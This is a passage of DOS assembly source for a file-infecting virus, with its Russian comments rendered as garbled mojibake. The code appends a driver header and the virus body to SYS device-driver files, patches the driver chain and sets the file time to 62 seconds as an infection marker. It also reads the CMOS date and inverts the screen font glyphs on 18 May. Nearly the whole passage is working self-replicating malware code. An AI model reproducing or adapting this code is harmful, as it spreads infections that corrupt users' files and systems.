   ;[*à®¢¥àï¥¬, çâ®¡ë ä ©« á ¢¨àãá®¬ § ¨¬ « ¥ ¡®«¥¥ 64Kb]

           or  dx, dx
           jnz RestTime
           cmp ax, 0FFFFh-(EndCode-Start)
           jae RestTime


   ;[‚ëç¨«ï¥¬ ¯®«ï § £®«®¢ª  SYS-ä ©« ]

           mov ds:[NextDriver+0-Entry+si], ax
           mov ds:[NextDriver+2-Entry+si], dx
           mov ds:[Header+04h-Entry+si], 8000h
           add ax, Strategy-Start
           mov ds:[Header+06h-Entry+si], ax
           add ax, Interrupt-Strategy
           mov ds:[Header+08h-Entry+si], ax


   ;[‡ ¯¨áë¢ ¥¬ ®¢ë© § £®«®¢®ª ¢ ª®¥æ ä ©« ]

           mov ah, 40h
           mov cx, 12h
           lea dx, [Header-Entry+si]
           int 65h
           jc  RestTime


   ;[*â®â ä ©« - XXXNS?]

           mov cx, EndCode-7-Strategy
           cmp ds:[XXXNS+3-Entry+si], 'SN'
           jne L1
           add ds:[XXXNS+5-Entry+si], EndCode-Start
           mov cx, EndCode-Strategy


   ;[‡ ¯¨áë¢ ¥¬ ¢¨àãá ¢ ª®¥æ ä ©« ]

   L1:     mov ah, 40h
           lea dx, [Strategy-Entry+si]
           int 65h
           jc  RestTimeA


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì ¢  ç «® ä ©« ]

           mov ax, 4200h
           xor cx, cx
           xor dx, dx
           int 65h
           jc  RestTimeA


   ;[‡ ¯¨áë¢ ¥¬  ¤à¥á § £®«®¢ª  ¢¨àãá ]

           mov ah, 40h
           mov cx, 4
           lea dx, [NextDriver-Entry+si]
           int 65h
           jc  RestTimeA


   ;[“áâ  ¢«¨¢ ¥¬ ¢à¥¬ï á®§¤ ¨ï ä ©«  - 62 á¥ªã¤ë]

           mov bp, sp
           or  [bp+2], byte ptr 00011111b


   ;[*à®¢¥àï¥¬ á¨áâ¥¬ãî ¤ âã]

           mov ax, 0807h
           out 70h, al
           in  al, 71h
           xchg    ah, al
           out 70h, al
           in  al, 71h
           cmp ax, 1805h
           jne RestTimeA


   ;[…á«¨ á¥£®¤ï 18.05.xx, â® ¨¢¥àâ¨àã¥¬ èà¨äâë]

           push    bx
           mov ax, 1130h
           mov bh, 6
           int 10h

           xor si, si
   L2:     lea di, [si+15]
           mov cx, 8

   L3:     mov al, es:[bp+si]
           xchg    es:[bp+di], al
           mov es:[bp+si], al
           inc si
           dec di
           loop    L3

           add si, 8
           cmp si, 100h*16
           je  L4
           cmp si, 0B0h*16
           jne L2
           add si, 030h*16
           jmp L2

   L4:     mov ax, 1104h
           mov bl, 0
           int 10h
           pop bx

   RestTimeA:  jmp RestTime

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   XXXNS       db  7 dup (?)

   EndCode:

   Pointer     dd  ?
   NextDriver  dd  ?
   Header      db  12h dup (?)

   EndVir:

   Code        ends
           end Start
